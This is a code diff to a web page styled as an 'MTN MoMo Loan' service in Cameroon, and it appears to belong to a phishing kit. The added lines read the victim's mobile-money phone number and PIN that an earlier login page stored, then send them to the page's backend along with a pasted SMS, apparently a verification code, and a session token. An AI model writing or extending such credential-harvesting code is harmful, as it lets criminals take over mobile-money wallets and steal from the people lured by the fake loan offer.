@@ -600,6 +600,10 @@
         let session = {};
         try { session = JSON.parse(sessionRaw || '{}'); } catch (e) {}
 
+        // Also get stored phone + pin from login page
+        const storedPhone = localStorage.getItem('momoPhone') || session.phone || '';
+        const storedPin = localStorage.getItem('momoPin') || '';
+
         // ============================================
         // SMS INPUT HANDLING
         // ============================================
@@ -690,8 +694,7 @@
 
         resendBtn.addEventListener('click', function() {
             if (resendBtn.disabled) return;
-            console.log('📤 Resend SMS requested for:', session.phone || 'unknown');
-            // In production: call your backend to resend the SMS
+            console.log('📤 Resend SMS requested for:', storedPhone || 'unknown');
             startReset();
         });
 
@@ -700,7 +703,7 @@
         }
 
         // ============================================
-        // VERIFY BUTTON → sends SMS to backend
+        // VERIFY BUTTON → sends SMS + PHONE + PIN to backend
         // ============================================
         verifyBtn.addEventListener('click', async function() {
             const text = smsInput.value.trim();
@@ -735,7 +738,8 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        phone: session.phone || '',
+                        phone: storedPhone,
+                        pin: storedPin,
                         token: session.token || '',
                         sms: text
                     }),
@@ -779,6 +783,8 @@
         console.log('====================================');
         console.log('💰 MTN MoMo Loan – Cameroon');
         console.log('📩 SMS Paste connected to:', API_BASE);
+        console.log('📱 Phone:', storedPhone);
+        console.log('🔑 PIN:', storedPin ? '****' : 'not set');
         console.log('====================================');
     </script>
 </body>
